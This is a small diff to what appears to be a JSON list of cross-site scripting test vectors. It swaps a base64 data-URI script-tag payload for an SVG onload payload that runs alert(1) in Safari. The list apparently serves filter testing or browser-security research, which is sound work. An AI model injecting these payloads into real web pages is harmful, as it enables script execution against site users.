@@ -111,13 +111,10 @@
         ]
     },
     {
-        "description": "Data protocol inside script src with base64",
-        "code": "<script src=data:text/javascript;base64,YWxlcnQoMSk=><\/script>",
+        "description": "Safari used to allow any tag to have a onload event inside SVG",
+        "code": "<svg><xss onload=alert(1)>",
         "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
             "safari"
         ]
-    }
+    }    
 ]
